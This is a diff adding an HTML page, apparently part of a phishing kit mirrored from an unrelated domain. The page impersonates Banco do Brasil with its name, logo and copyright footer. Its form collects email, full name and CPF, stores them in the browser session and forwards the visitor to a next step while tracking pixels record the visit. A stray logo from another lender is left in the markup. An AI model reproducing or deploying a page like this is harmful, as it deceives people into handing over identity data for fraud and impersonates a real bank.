@@ -1,0 +1,231 @@
+<html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil</title>
+    <script src="js/br.js" defer=""></script>
+</head>
+
+<body>
+    <!-- Mirrored from dominio-aprovadissimo.online/log/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 06:09:43 GMT --><!-- Added by HTTrack --><!-- /Added by HTTrack -->
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>    <script>
+        window.pixelId = "6859e32ca14726c70bec872f";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+
+
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background: white;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #3354fd;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #3354fd !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #3354fd;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+
+
+
+
+
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 60px;" src="images/logobrasil.png" alt="Imagem Centralizada" data-lazy-src="https://upload.wikimedia.org/wikipedia/pt/a/a3/Crefisa.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;"
+                    src="../wikipedia/pt/a/a3/Crefisa-1.html" alt="Imagem Centralizada"></noscript>
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem;">
+            <!-- Seção 7: Formulário de Cadastro -->
+            <div style="margin-top: 18px;" class="main-content">
+                <div id="formulario" class="mb-3">
+                    <p style="color:gray; text-align:initial">Preencha os campos abaixo</p>
+                    <form id="cadastroForm" style="text-align:initial">
+
+                        <div class="mb-3">
+                            <label for="cpf" class="form-label" style="color:gray; font-size:13px">E-mail</label>
+                            <input type="text" class="form-control" id="cpf" placeholder="email@email.com">
+                        </div>
+                        <div class="mb-3">
+                            <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome
+                                completo</label>
+                            <input type="text" class="form-control" id="nome" placeholder="Ex: Maria" value="">
+                        </div>
+                        <div class="mb-3">
+                            <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
+                            <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00" value="">
+                        </div>
+
+
+                        <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
+                            <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #3354fd;"></i>
+                        </div>
+                        <button class="btn-custom">Continuar</button>
+
+                    </form>
+
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function () {
+                            // Recupera do sessionStorage
+                            const cpf = sessionStorage.getItem('cpf');
+                            const nomeCompleto = sessionStorage.getItem('nomeCompleto');
+
+                            // Pega os elementos dos inputs
+                            const inputNome = document.getElementById('nome');
+                            const inputCpf = document.querySelectorAll('#cpf')[1]; // Segundo #cpf
+                            const inputEmail = document.querySelectorAll('#cpf')[0]; // Primeiro #cpf (que é o email no seu HTML)
+
+                            // Formatar CPF (000.000.000-00)
+                            function formatarCpf(cpf) {
+                                return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
+                            }
+
+                            // Preencher e bloquear os campos
+                            if (cpf && nomeCompleto) {
+                                inputNome.value = nomeCompleto;
+                                inputCpf.value = formatarCpf(cpf);
+                            }
+
+                            // Função ao clicar no botão
+                            const form = document.getElementById('cadastroForm');
+                            form.addEventListener('submit', function (event) {
+                                event.preventDefault(); // Impede envio automático
+
+                                const email = inputEmail.value.trim();
+
+                                if (email !== "") {
+                                    sessionStorage.setItem('email', email);
+
+                                    // Pegar os parâmetros da URL atual
+                                    const params = window.location.search;
+
+                                    // Construir a nova URL de redirecionamento
+                                    const destino = '/05' + (params ? params : '');
+
+                                    // Redirecionar
+                                    window.location.href = destino;
+                                } else {
+                                    alert('Por favor, preencha seu e-mail antes de continuar.');
+                                }
+                            });
+
+                            // Corrigir o botão (remover onclick errado no HTML)
+                            const button = form.querySelector('button');
+                            button.removeAttribute('onclick');
+                        });
+                    </script>
+
+                </div>
+
+            </div>
+        </div>
+        <script type="rocketlazyloadscript" src="scriptValida.html" defer=""></script>
+        <div class="footer py-4" id="footerChg">
+            © 2025 Banco do Brasil S.A.<br>CNPJ: 00.000.000/0001-91<br> <br>
+            Todos os direitos reservados
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+</body><!-- Mirrored from dominio-aprovadissimo.online/log/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 06:09:47 GMT --></html>
